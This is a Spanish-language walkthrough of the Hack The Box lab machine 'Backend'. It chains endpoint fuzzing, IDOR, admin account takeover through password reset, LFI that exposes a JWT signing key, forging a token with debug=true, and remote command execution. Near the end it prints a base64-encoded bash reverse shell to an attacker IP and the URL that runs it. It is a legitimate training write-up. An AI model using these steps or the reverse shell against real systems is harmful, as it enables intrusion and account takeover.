---
title: Write Up - Hack The Box - Backend
date: 2026-01-26 06:00:00 +0100
categories: [writeups]
tags: [pentesting, hackthebox,cybersecurity,writeups]
pin: true
---


![Screenshot0](/assets/writeups/backend/backend.png)

#### Resumen de la máquina

>Esta máquina presenta una infraestructura basada en una **API (FastAPI)** que expone diversos endpoints. La explotación comienza con la enumeración de rutas ocultas mediante fuzzing, lo que revela vulnerabilidades de **IDOR**. Tras escalar privilegios a nivel de API mediante el secuestro de la cuenta de administrador, se descubre un **LFI** y un **RCE** condicionado por una variable de depuración en el token JWT.

#### Heramientas utilizadas:

>nmap
>wfuzz
>burpsuite
>jwt_tool

### Reconocimiento:

El escaneo inicial revela un servicio web en el puerto 22,80 asociado al dominio `backend.htb`.

### Enumeración y explotación de vulnerabilidades:



Esta maquina requiere a una enumeración exhaustiva 

```
wfuzz -c --hc=404 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 200 http://backend.htb/FUZZ
wfuzz -c --hc=404,422 --hh=4 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 200 http://backend.htb/api/v1/user/FUZZ
```


endpoints interesantes
```
/docs
/api
/api/v1
/api/v1/user
/api/v1/user/1  /api/v1/user/01 /api/v1/user/001
/api/v1/admin
/api/v1/admin/file

```


Probamos con POST
```
wfuzz -c -X POST --hc=405,404  -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 200 http://backend.htb/api/v1/user/FUZZ
```

Encontramos 
```
/api/v1/user/login 
/api/v1/user/singup
```

Enumeración de usuarios via IDOR


![Screenshot1](/assets/writeups/backend/1.png)

Campos requeridos para loggearse

![Screenshot2](/assets/writeups/backend/2.png)

Registramos usuario en el endpoint que encontramos anteriormente

```
curl -X POST "http://backend.htb/api/v1/user/signup" -H "Content-Type: application/json" -d '{"email":"foo2@bar.com","password":"foo"}'
```

Nos logeamos

```
curl "http://backend.htb/api/v1/user/login" -d "username=foo@bar.com&password=foo"
```

![Screenshot3](/assets/writeups/backend/3.png)

Establecemos  el access token a la funcionalidad de burpsuite match and replace para que cada solicitud que realicemos use el token

![Screenshot4](/assets/writeups/backend/4.png)


Ahora tenemos acceso a la api **Fast Api** donde obtenemos acceso a diferentes funcionalidades.

La primera que hacemos es obtener la user flag


![Screenshot5](/assets/writeups/backend/5.png)


La siguiente funcionalidad que llama la atencion es actualizar la contraseña donde introduciremos el guid del usuario que encontramos anteriormente + la nueva contraseña

![Screenshot6](/assets/writeups/backend/6.png)


![Screenshot7](/assets/writeups/backend/7.png)


Obtenemos el token del administrador

```
curl "http://backend.htb/api/v1/user/login" -d "username=admin@htb.local&password=foo123"
```

Cambiamos el token establecido anteriormente en el match & replace de burpsuite

Ahora tenemos acceso a nuevas funcionalidades, destacamos dos:

- LFI en /api/v1/admin/file 
- command execution en /api/v1/admin/exec donde es tener el campo **debug=true**


![Screenshot8](/assets/writeups/backend/8.png)



leemos el archivo **/proc/self/environ** el cual almacena las **variables de entorno** del proceso que lo está consultando


![Screenshot9](/assets/writeups/backend/9.png)

![Screenshot10](/assets/writeups/backend/10.png)


Lo descargamos y formateamos 
```
curl file:///home/ari/Descargas/response_1769381983740.json | jq '.file' -r > main.py
```

![Screenshot11](/assets/writeups/backend/11.png)


![Screenshot12](/assets/writeups/backend/12.png)

con **jwt_tool** añadimos el campo debug= true

```
python3 jwt_tool.py 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNzcwMDg5NTY1LCJpYXQiOjE3NjkzOTgzNjUsInN1YiI6IjEiLCJpc19zdXBlcnVzZXIiOnRydWUsImd1aWQiOiIzNmMyZTk0YS00MjcxLTQyNTktOTNiZi1jOTZhZDU5NDgyODQifQ.GMdNhbWtHX9O-DaL89_0hYq_tCBpTrONPC4eBM7JBgo' -T -S hs256 -p 'SuperSecretSigningKey-HTB'
```


![Screenshot13](/assets/writeups/backend/13.png)


Ahora en el endpoint /api/v1/admin/exec/whoami podemos ejecutar comandos dentro del sistema. 
Nos enviamos una reverse shell

```
echo -n 'bash -i >& /dev/tcp/10.10.15.135/443 0>&1' | base64 -w 0;echo
YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNS4xMzUvNDQzIDA+JjE=
http://backend.htb/api/v1/admin/exec/echo%20YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNS4xMzUvNDQzIDA+JjE=|base64%20-d|bash
```

![Screenshot14](/assets/writeups/backend/14.png)



### Escalada de privilegios:


La escalada de privilegios de esta maquina se basa simplemente en leer un .log

![Screenshot9](/assets/writeups/backend/15.png)











